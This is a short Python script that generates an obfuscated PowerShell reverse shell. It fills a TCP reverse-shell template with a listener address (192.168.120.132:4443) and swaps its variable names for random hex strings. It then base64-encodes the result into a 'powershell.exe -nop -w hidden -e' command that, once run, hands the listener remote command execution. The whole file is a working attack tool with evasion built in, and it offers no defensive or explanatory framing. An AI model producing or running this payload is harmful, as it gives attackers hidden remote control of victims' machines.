import base64, re, os, binascii
def find_variables(ps_code: str) -> list[str]:
    """Find all variables in PowerShell code."""
    variables: set[str] = set()
    variable_pattern = r'\$([a-zA-Z0-9-]+)'
    matches = re.findall(variable_pattern, ps_code)
    for variable_name in matches:
        variables.add(f"${variable_name}")
    return list(variables)
def get_rand_hex() -> str:
    """Generate a random hex string."""
    return binascii.b2a_hex(os.urandom(16)).decode()
def encode_payload(template: str, options: dict[str, str], obfuscate_variable: bool = True, encode_base64: bool = True) -> str:
    """
    Encode a PowerShell payload with various options.
    Args:
        template: The PowerShell template
        options: Dictionary of options to replace in the template
        obfuscate_variable: Whether to obfuscate variable names
        encode_base64: Whether to base64 encode the final payload
    Returns:
        The encoded payload
    """
    encoded_payload: str = template
    # Replace template placeholders with actual values
    for key, value in options.items():
        encoded_payload = encoded_payload.replace(f"{key.upper()}", str(value))
    # Obfuscate variable names if requested
    if obfuscate_variable:
        variables = find_variables(ps_code=encoded_payload)
        for variable in variables:
            encoded_payload = encoded_payload.replace(variable, f"${get_rand_hex()}")
    # Base64 encode if requested
    if encode_base64:
        # Convert to UTF-16LE (little endian) which is what PowerShell expects
        utf16_bytes = encoded_payload.encode('utf-16le')
        b64_encoded = base64.b64encode(utf16_bytes).decode()
        encoded_payload = f"powershell.exe -nop -w hidden -e {b64_encoded}"
    return encoded_payload

TEMPLATE_TCP = "$client=New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2 = $sendback + 'PSReverseShell# ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();};$client.Close();"
OPTIONS = {
    "lhost": "192.168.120.132",
    "lport": 4443
}


payload = encode_payload(template=TEMPLATE_TCP, options=OPTIONS)
if __name__ == "__main__":
    print(payload)